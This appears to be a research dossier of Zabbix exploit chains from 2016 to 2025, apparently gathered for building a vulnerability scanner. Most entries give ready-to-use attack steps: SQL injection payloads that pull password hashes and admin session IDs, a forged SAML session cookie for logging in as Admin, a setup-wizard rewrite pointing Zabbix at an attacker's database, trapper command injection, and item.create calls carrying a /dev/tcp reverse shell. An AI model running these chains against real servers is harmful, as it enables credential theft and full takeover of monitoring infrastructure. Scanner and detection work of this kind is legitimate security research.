pocs.steps: SQL injection in jsrpc.php (profileIdx2), error-based 'Duplicate entry'. GET /jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=<SQL>&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1. SQL: (select 1 from (select count(*),concat((select(select concat(cast(concat(alias,0x7e,passwd,0x7e) as char),0x7e)) from zabbix.users LIMIT N,1),floor(rand(0)*2))x from information_schema.tables group by x)a) — extract alias~passwd; then from zabbix.sessions where status=0 and userid=N — the sessionid (useful for logging in as Admin afterwards).
pocs.conditions: Zabbix 2.0.x-3.0.3 (fixed in 3.0.4). No authentication (the sid is hardcoded arbitrarily, the stack is not checked).

pocs.steps: Injection into toggle_ids on latest.php, stacked query: GET (or POST) latest.php?output=ajax&sid=<sid>&favobj=toggle&toggle_open_state=1&toggle_ids[]=15385);select * from users where (1=1 — the profile is inserted into INSERT INTO profiles ...'); <SQL> via CProfile::insertDB()/DBexecute() (frontends/php/include/profiles.inc.php:185). The author (1n3) shows that an authenticated user or guest mode is sufficient for exploitation.
pocs.conditions: Zabbix 2.2.x, 3.0.x (fixed in 3.0.4). Requires a session (User/guest); with guest mode enabled — without a password.

pocs.steps: MSF auxiliary/gather/zabbix_toggleids_sqli (CVE-2016-10134, author bperry): 1) GET /index.php → extract the sid (name="sid" value=...) and cookies; 2) POST latest.php?output=ajax&sid=<sid> with vars: favobj=toggle, toggle_ids[]='348 <SQL>', toggle_open_state=0; 3) error-based extraction via COUNT(*)+GROUP BY dup-entry: AND (SELECT 5361 FROM(SELECT COUNT(*),CONCAT(marker,(SELECT ...),marker,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) — enumerates the databases and the users table (alias, passwd) in all schemas, saves to loot JSON.
pocs.conditions: Zabbix 3.0.3 and earlier (fixed in 3.0.4). REQUIREAUTH=false by default (can be used without authentication); otherwise log in as Admin/zabbix.

pocs.steps: Vulhub lab 3.0.3: 1) without authentication: /jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0) — error-based updatexml; 2) a variant via latest.php (guest): /latest.php?output=ajax&sid=<the last 16 chars of the zbx_sessionid cookie from the guest session>&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0). Then the standard chain to RCE: SQLi -> the Admin sessionid -> login -> script execution (see exploit-db 39937 'Zabbix API JSON-RPC RCE').
pocs.conditions: Zabbix 3.0.3 docker (Ubuntu+MySQL). jsrpc.php — without authentication; latest.php — guest mode.

pocs.steps: Full SQLi->RCE chain (2016): 1) error-based SQLi (jsrpc.php profileIdx2) harvests the administrator sessionid from zabbix.sessions; 2) log in with that sessionid; 3) an item/script with a command is created via the frontend/API and executed (analogous to the MSF zabbix_script_exec technique), giving command execution on the Zabbix Server/hosts.
pocs.conditions: Zabbix 2.2.x-3.0.3; requires an active admin session in sessions or a weak Admin password.

research_notes: The main public injection of 2016: two vectors — jsrpc.php?profileIdx2 (no authentication) and latest.php?toggle_ids[] (guest/authenticated, stacked query into INSERT INTO profiles). The MSF module check was verified. In NVD: 'before 2.2.14 and 3.0 before 3.0.4'.

IMPORTANT: per NVD (https://nvd.nist.gov/vuln/detail/CVE-2016-10135) CVE-2016-10135 is NOT Zabbix: it is an LG MTKLogger vulnerability (Android, MTK chipsets, com.mediatek.mtklogger — exportable components), CNA cve@mitre.org. The Zabbix injection in jsrpc.php/latest.php carries ONLY CVE-2016-10134 (confirmed by the 1n3 disclosure https://seclists.org/fulldisclosure/2016/Aug/60, which names the 3.0.4 fix and only one CVE). Apparently the task list contains a misattribution from outdated lists where 10134/10135 went as a pair. No public PoC 'for Zabbix CVE-2016-10135' exists. For the scanner: map 10134, ignore 10135 or mark it as non-Zabbix.

pocs.steps: RCE in the Zabbix Server trapper via a fake agent registration (auto-registration). 1) Precondition: the Auto-registration action ('Add host') is enabled on the server in Configuration->Actions. 2) Step 1: open a TCP connection to port 10051, send the JSON {"request":"active checks","host":"vulhub","ip":";touch /tmp/success"} — the ip field is not validated and is stored as the host interface address. 3) Step 2: enumerate hostid (10000..10500 in the PoC), sending {"request":"command","scriptid":1,"hostid":"<id>"}; when the hostid matches, the server executes the remote command for the host, substituting the stored ip into the shell command (system()/popen), and ";touch /tmp/success" executes ON THE SERVER ITSELF as the zabbix user. Success: no 'failed' in the response and /tmp/success is created.
pocs.conditions: Zabbix Server 2.0.x<2.0.21, 2.2.x<2.2.18, 2.4.x (2.4.0-2.4.9+rc), 3.0.x<3.0.9, 3.2.x<3.2.5 (Talos TALOS-2017-0325). Port 10051 reachable; auto-registration enabled; the server has permission to execute remote commands.

pocs.steps: Talos report: command injection in the 'trapper command functionality'. The attacker, from an 'active proxy', sends crafted packets to port 10051: host registration with an injection into the address field, then a 'command' request to trigger execution. The report describes all affected branches and fixes (2.4.x — 2.4.9+, 3.0.x — 3.0.9, 3.2.x — 3.2.5).
pocs.conditions: Same as above; the zbx protocol details (ZBXD\x01 + length) are in the Zabbix documentation.

research_notes: Mechanics: when executing a remote command for a host, the server substitutes the host interface address stored in the DB into the command (e.g., zabbix_get -s <ip> ...), so an ip like ';cmd' gives injection. CVE-2017-2825 (adjacent, trapper DoS) is not required by the task list but is mentioned in the same Talos report. No Metasploit module.

pocs.steps: Login bypass (CWE-862/306): GET /zabbix.php?action=dashboard.view&dashboardid=1 without any cookies/credentials -> HTTP 200 and the dashboard contents (zbx_sessionid and PHPSESSID are set). The anonymous user can then create Dashboards/Reports/Screens/Maps; the created items are visible to other users and to the admin.
pocs.conditions: Zabbix 2.x-4.2 (per the author), 'through 4.4' per NVD; fixed in 4.4.1 (Snyk range [,4.4.1)). No authentication is required.

pocs.steps: Perl script (Todor Donev): GET <host>/zabbix/zabbix.php?action=dashboard.view&dashboardid=1 with LWP::UserAgent; if the response contains 'Dashboard' — vulnerable; it lists the available action pages (dashboard.view, problem.view, overview.php, latest.php, charts.php, screens.php, map.view, etc.).

research_notes: ZBX-16789. Per NVD 'Zabbix through 4.4'; fixed in 4.4.1 (Snyk SNYK-UNMANAGED-ZABBIXZABBIX-2364940, range [,4.4.1)); in older LTS branches closed by backports (Debian patch 2023). Impact: anonymous dashboard access, item creation, and XSS-like scenarios based on them.

pocs.steps: SAML SSO authentication bypass (source SonarSource; PoCs by @random-robbie/@jweny/@Mr-xn): 1) GET / (or /index.php) without authentication — the server issues the zbx_session cookie (base64url). 2) base64-decode -> JSON of the form {"sessionid":"<32hex>","sign":"<hex>"} (in 5.0/5.4) or {"sessionid","serverCheckResult","serverCheckTime","sign"} (6.0.0beta). 3) Add "saml_data":{"username_attribute":"Admin"} to the JSON (the target username is known in advance) WITHOUT touching sessionid and sign. 4) base64-encode, set it as zbx_session. 5) GET /index_sso.php with this cookie — index_sso.php sees saml_data and calls user.loginByUsername('Admin') -> redirect to the dashboard as Admin. KEY POINT: the signature is NOT computed and NOT verified — checkSign() (CEncryptedCookieSession::checkSign, in 5.4 based on CEncryptHelper::sign/AES-ECB) is called only when extracting sessionid, and in index_sso.php it is never called at all; sign is taken as-is from the user's own anonymous cookie (CWE-565).
pocs.conditions: SAML SSO enabled (not the default); know the Zabbix username ('Admin' by default; or guest, if enabled). Vulnerable: 4.0.0-4.0.36, 5.0.0-5.0.18, 5.4.0-5.4.8, 6.0.0beta1; fixed in 4.0.37, 5.0.19, 5.4.9, 6.0.0beta2 (commit 0395828a — signing of SAML attributes, eea1f70a — switch to HMAC).

pocs.steps: Nuclei template (zabbix-saml-bypass.yaml): the same principle — decode zbx_session, add saml_data.username_attribute, re-encode, GET index_sso.php; detection by 'action=dashboard' occurring in the response.
pocs.conditions: SAML SSO enabled; the fix versions above.

pocs.steps: In-depth write-up: client-side session (CCookieSession/CEncryptedCookieSession, session_set_save_handler), read() loads all cookie fields into $_SESSION; checkSign() is called only in extractSessionId(); index_sso.php: if (CSessionHelper::has('saml_data')) { loginByUsername($saml_data['username_attribute'], ...) } — the field is fully client-controlled. Also describes the patch (adding SAML attribute signing + HMAC instead of AES-ECB) and a video demo.

research_notes: CISA KEV (active exploitation since 2022). Chain after the bypass: admin access -> script/API RCE (see CVE-2021-46088, EDB 50816, MSF zabbix_script_exec). The cookie format is version-dependent: in 5.0/5.4 the JSON is {"sessionid","sign"}; in 6.0 beta serverCheckResult/serverCheckTime were added; in newer versions the signature is HMAC-SHA256(key=session_key from the DB config, data=JSON sorted compact) and sign sits inside base64(JSON); the 'base64(payload).hexsig' format with a dot belongs to other branches — verify against the frontend code.

pocs.steps: Reconfigure an installed Zabbix via setup.php (step 6) without authentication. 1) Craft the cookie zbx_session = base64url({"step":"6","default_timezone":"system","DB_TYPE":"MYSQL","DB_SERVER":"<attacker ip>","DB_PORT":3306,"DB_DATABASE":"zabbix","DB_USER":"zabbix","DB_PASSWORD":"<pass>"}). 2) POST /zabbix/setup.php with data sid=<16 hex>, form_refresh=1, next[5]=Next step and this cookie. 3) CSetupWizard::stage6() creates conf/zabbix.conf.php from the session values (getConfig() reads $_SESSION, the signature is not verified — checkSign() is not called) and writes the config on the server, pointing to the attacker's DB. 4) Precondition: the attacker's MySQL with the full zabbix schema and the zabbix user (MySQL 8 requires mysql_native_password: ALTER USER ... IDENTIFIED WITH mysql_native_password BY ...). 5) After the config is rewritten, the frontend talks to the attacker's DB; log in with known credentials -> full access.
pocs.conditions: Zabbix Frontend 5.4.0-5.4.8rc1, 6.0.0alpha1-beta1 (NIST; some sources add 5.0.x/4.0.x — no exact range in the NVD cpe); fixed in 5.4.9/6.0.0beta2 (commit 20943ae3 — early exit if the instance is already installed and the user is not a Super Admin). Requires the attacker's DB.

pocs.steps: Mechanics: setup.php uses the session to store step progress (CSetupWizard), the cookie signature is never verified on this path; the attacker puts step=6 + the DB parameters straight into the cookie; stage6() assembles CConfigFile from getConfig() (a wrapper over $_SESSION) and saves zabbix.conf.php. Additional development vectors noted: LOAD DATA LOCAL (disabled in newer PHP), phar:// via file_exists() during DB validation; access does not give agent control, since the server and frontend must point to the same DB.

research_notes: CISA KEV. A real 2022 exploitation scenario: CVE-2022-23134 to get into the setup wizard + CVE-2022-23131/strong admin scenarios. NVD severity moderate, but in practice = full takeover of the frontend configuration.

Mechanics (ZBX-23854, CWE-565, CVSS 9.6 per Zabbix / 8.8 NVD): a URL widget on the dashboard loads an arbitrary URL (set by any Zabbix user); when testing or executing scheduled reports (available to Admin/Super admin only), the server/web service sends the zbx_session cookie of the user who created the report to that URL. The owner of the receiving site gets the cookie and can impersonate that user (session hijack -> privilege escalation). Affected: 6.0.0-6.0.21 (fixed 6.0.22, commit 89e0cd6ea93), 6.4.0-6.4.6 (fixed 6.4.7, commit 3f22d7dd372), 7.0.0alpha1-alpha3 (fixed alpha4/alpha5, commit 4428a58a30f). No public PoC code found (the attack is trivial — a controlled web server and the URL widget suffice). Version fingerprinting and manual checking are reasonable.

Mechanics (NVD, Zabbix advisory 2024): a URL added to a map element (sysmapelementurlid) is stored with sequential IDs; a user manipulating sysmapelementurlid+1 blocks others from adding URLs (effectively DoS/sequence spoofing, 'Improper Access Control'). Not RCE. No public PoCs. For the scanner: low priority, condition-check only.

Mechanics (NVD): no validation of the 'Name' field on the Graph page in Items — stored XSS (improper input validation). No public PoCs found in exploit-db/metasploit/github search. Check manually: enter <img/script> into the graph Name and view the page.

pocs.steps: Full toolkit (3 scripts). Precondition: a low-privilege user with permission to execute at least one script (check: the menu on the Hosts page). 1) Grab the sessionid: log in (guest/user), decode the zbx_session cookie (base64 JSON {"sessionid","serverCheckResult","serverCheckTime","sign"}) and take the sessionid; take the hostid (Monitoring->Hosts) and an allowed scriptid. 2) Time-based blind SQLi: on TCP/10051 send the frame ZBXD\x01 + 8 bytes of LE length + JSON {"request":"command","sid":<sessionid>,"scriptid":"2","hostid":"10084","clientip":"' + (SQL) + '"} — clientip lands in the audit record without sanitization. SQL: (select CASE WHEN ascii(substr((select session_key from config),POS,1))=ORD THEN sleep(10) ELSE sleep(1) END) — extract the 32-hex session_key character by character; then (select sessionid from sessions where userid=1 limit 1) — the admin sessionid. 3) The CVE-2024-22120-LoginAsAdmin.py script/built-in forge: build the zbx_session cookie from the JSON {"sessionid":<admin sid>,"serverCheckResult":true,"serverCheckTime":<ts>,"sign":HMAC-SHA256(key=session_key, data=JSON(sorted,compact))}, base64 -> GET /zabbix.php?action=dashboard.view. 4) RCE (CVE-2024-22120-RCE.py): via api_jsonrpc.php script.create ({"command":"<cmd>","name":"x","type":0,"scope":2}) -> script.execute({"scriptid":..,"hostid":..}) — the global script executes on the Zabbix Server as the zabbix user; then script.update/script.delete. The Webshell.py alternative usually fails (zabbix filesystem permissions).
pocs.conditions: Zabbix 6.0.0-6.0.27 (fixed 6.0.28rc1), 6.4.0-6.4.12 (fixed 6.4.13rc1), 7.0.0alpha1-beta1 (fixed 7.0.0beta2). Needed: port 10051 reachable, a low-priv account with script permission (or guest, if a script is allowed for it), hostid+scriptid. Zabbix claimed high privileges, NVD low (check the role/host permissions).

pocs.steps: Practical replication of the chain (HTB Watcher, Zabbix 6.4.12): guest session -> sessionid from the cookie; a scriptid that is actually allowed (in the lab 1 or 2, not 3); the zabbix_server_time_based_blind_sqli.py script (pwntools) extracts session_key from config and the admin sessionid; cookie forge; then CVE-2024-22120-RCE.py gives an interactive shell (uid=zabbix). Confirmed that the brute-force time is ~tens of minutes (sleep 1/10).
pocs.conditions: Lab environment; all steps match ZBX-24505.

research_notes: ZBX-24505. Essence: the script.execute command is recorded in the Audit Log with the clientip field (the connecting IP), which is not escaped in the INSERT — time-based blind SQLi. Important detail: the attack goes over the trapper protocol (10051), not via the web. The guest user usually has no script permissions — a real low-priv account is needed. One of the two main 'Zabbix 7.0.x RCE' vectors of 2024-2025 (together with CVE-2024-42327).

Mechanics (NVD): a non-admin user can change/delete important Zabbix Agent configuration functions (integrity/availability impact). No detailed public PoCs (probable: agent-config permissions via the API/frontend without a role check). For the scanner: condition-based, check manually.

Mechanics (ZBX-25012, NVD): AT command injection on the Zabbix Server in SMS media: the 'Number' field is validated neither on the web nor on the server; when testing an SMS (or actually sending one), a crafted number allows extra AT commands to be executed on the GSM modem. Requires SMS media configuration (admin) and a physical modem. No public PoCs found in open sources.

Mechanics (NVD): when configuring SMS media, an arbitrary file can be specified as the 'GSM modem device'; since in Linux 'everything is a file', one can specify, e.g., a log file: zabbix_server starts talking to it as a modem — the log is corrupted by AT commands and a small part of the file contents leaks into the UI. Arbitrary-file-read-ish. No public PoCs.

RCE (ZBX-25016, 'Remote code execution within ping script', critical): an administrator with restricted permissions can exploit script execution in Monitoring->Hosts; the lack of script parameter escaping by default allows an arbitrary command to be injected via a parameter (e.g., into the standard Ping script) and executed on the target host/server. Affected: 6.4.9-6.4.15 (fixed 6.4.16rc1), 7.0.0alpha1-rc3 (fixed 7.0.0rc3/7.0.0), 6.0.x also partially (check). No public standalone PoC code found (exploitation = editing script parameters in the UI/API). One of the 'Zabbix 7.0.x RCE' vectors.

pocs.steps: Detection PoC (m4nb4): 1) POST /api_jsonrpc.php user.login ({"username","password"}) -> auth_token; 2) POST user.get with params {"selectRole":["roleid","name","type","readonly AND (SELECT(SLEEP(5)))"],"userids":["1","2"]} — if the response has no 'error' (sleeps 5s) — vulnerable. SQLi in CUser::addRelatedObjects (selectRole).
pocs.conditions: Zabbix 6.0.0-6.0.31 (fixed 6.0.32rc1), 6.4.0-6.4.16 (fixed 6.4.17rc1), 7.0.0-7.0.0 (fixed 7.0.1rc1). Requires an account with API access (the default User role fits), NOT admin.

pocs.steps: Full SQLi->RCE: 1) user.login -> auth_token; 2) time-based SQLi via user.get selectRole: (IF(ORD(MID((SELECT sessionid FROM zabbix.sessions WHERE userid=1 LIMIT 1),POS,1))=ORD THEN SLEEP(5) ...) — extract the admin sessionid with multiple threads; 3) with an admin session: host.get/selectInterfaces -> hostid+interfaceid; 4) item.create {"key_":"system.run[bash -c \"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\"]","type":0,...,"interfaceid":..} -> reverse shell on the agent/host (requires AllowKey=system.run[*]; in 5.0/6.0 the server is allowed on agents by default).
pocs.conditions: Versions above; an account with API access; for the RCE part — a reachable host+interface and AllowKey=system.run[*] on the agent (7.0: EnableGlobalScripts/scope affect only server-side scripts; the item technique — the agent).

pocs.steps: A similar privilege escalation -> RCE PoC: log in as a non-admin API user, time-based SQLi in user.get finds the admin session; with the admin token it creates an 'rce' item (system.run) on the first host from host.get and waits to catch the shell (nc). Parameters: --threads, --sleep-time, --row, --length.

research_notes: ZBX-25623. CUser.get is available to any user with API access; addRelatedObjects builds the query with selectRole (and other select fields) without escaping -> SQLi (the community version via selectHosts, etc. is also known). Basis: extracting the admin sessionid from zabbix.sessions -> privileges. CVSS 9.9 (Zabbix). One of the main 'Zabbix 7.0.x RCE' vectors. Watchdog1337/CVE-2024-42327_Zabbix_SQLI — another PoC of the same type.

Mechanics (ZBX-27282, HackerOne o4ncL1): an authenticated Super Admin sends crafted HTTP requests to the frontend's oauth.authorize action -> arbitrary web server file read (LFI, confidentiality loss). CVSS 6.8. Affected ONLY 7.4.0-7.4.2 (new 7.4 functionality), fixed in 7.4.3. No public PoCs (data is limited and incomplete; the detailed mechanics are not disclosed publicly — only the parameter action=oauth.authorize).

Mechanics (ZBX-26987, HackerOne kelsier, Snyk SNYK-GOLANG-GITHUBCOMZABBIXZABBIXSRCGOPLUGINSSMART-13102983, credit Janis Nulle): the smartctl plugin in Zabbix Agent 2 (src/go/plugins/smart) does not sanitize the smart.disk.get parameters -> injection of arbitrary arguments into the executed smartctl. On Windows hosts one can make smartctl reach an attacker-controlled SMB/UNC path and steal the NTLMv2 hash. Affected: 6.0.0-6.0.39 (fixed 6.0.40), 7.0.0-7.0.10 (fixed 7.0.11), 7.2.0-7.2.4 (fixed 7.2.5). Workaround: strict AllowKey/DenyKey validation or removing smartctl. No public PoC code; the attack = a request to the Agent 2 smart.disk.get metric with crafted parameters.

Mechanics (ZBX-26985): the same unsanitized smart.disk.get, but in Zabbix 5.0 (Agent 2 5.0.x) the argument injection gives remote code execution (CVSS 7.3). Affected: 5.0.0-5.0.46, fixed 5.0.47. No public PoC code found; the RCE injection details are not disclosed publicly (only 'unexpected arguments into smartctl command').

Mechanics (ZBX-26986): second-order SQL injection on the Zabbix Server: an administrator writes a malicious SQL into the 'Visible name' field of a host (or an auto-registered one); during automatic removal (autoremoval) of auto-registered hosts the value lands in the SQL query unescaped. Requires administrator rights (or influence over auto-registration). No public PoCs.

RCE (NVD): Zabbix 4.0 LTS/4.2/4.4/5.0 LTS — any user with the 'Zabbix Admin' role can execute an arbitrary shell script on the app server as the application user (this is the 'script execution' functionality; combined with CVE-2022-23131 it gives RCE after the SSO bypass). No dedicated PoC — the generic script/item technique is used (see MSF zabbix_script_exec, EDB 50816, EDB 39937).

pocs.steps: MSF zabbix_script_exec (authenticated RCE, useful after 23131/default credentials; tested on 2.0.5-6.0.0): 1) apiinfo.version; 2) user.login (Admin/zabbix) -> auth_token; 3) TECHNIQUE=script: script.create ({"command":payload,"name":rand,"type":0}, >=5.4 also "scope":2) -> hostgroup.get -> host.create (a host with the 127.0.0.1:10050 interface, TLS_PSK if set) -> script.execute ({"scriptid","hostid"}) — the global script executes on the Zabbix Server; TECHNIQUE=item (>=3.0, requires AllowKey=system.run[*]): host.create + item.create {"key_":"system.run[<payload>,nowait]","type":0,...} and waiting for the agent to poll. Works up to Zabbix 6.0.0.
pocs.conditions: Authenticated access (default Admin/zabbix on fresh installs); a role with script/create permission; for the item technique — AllowKey=system.run[*] on the agent.

research_notes: The classic authenticated-RCE technique 'create script + host 127.0.0.1 + execute' — a universal post-auth step for the scanner (works on 5.0.17 too — see EDB 50816 — and is used in all chains after SQLi/SSO bypass).

pocs.steps: Authenticated RCE on 5.0.17 (Hussien Misbah, GitHub HussienMisbah/tools): 1) POST /index.php {"request":"hosts.php","name","password","autologin":1,"enter":"Sign in"} — check for 'Zabbix 5.0.17' and 'Sign out'; 2) take the hostid (filter_hostids%5B0%5D) and the csrf token (meta name=csrf-token) from the page; 3) POST /items.php form=create with key=system.run[<reverse shell>,nowait], name/type=0 and the other form fields; 4) find the itemid in the list /items.php?page=N; 5) POST /items.php form=update + check_now='Execute now' -> after ~1 min the agent executes the command. Blind RCE.
pocs.conditions: Zabbix 5.0.17 (author's test), an admin account, an agent with AllowKey=system.run[*] (default in 5.0); the attacker's listener.

research_notes: Without an attached CVE (admin-by-design script execution); included as a reliable post-auth RCE reference for the scanner in active mode. The same system.run+check_now technique covers CVE-2021-46088-like scenarios.
